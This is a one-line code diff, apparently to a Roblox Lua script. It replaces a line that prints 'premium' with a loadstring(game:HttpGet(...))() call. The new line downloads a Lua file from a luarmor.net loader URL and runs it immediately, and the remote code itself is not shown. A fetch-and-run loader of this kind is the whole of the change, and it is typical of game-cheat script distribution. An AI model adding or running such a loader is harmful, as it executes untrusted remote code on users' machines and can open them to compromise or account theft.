@@ -1,1 +1,1 @@
-print("premium")
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/360e2f87945399a3ff0bfa9b6bdca5b5.lua"))()
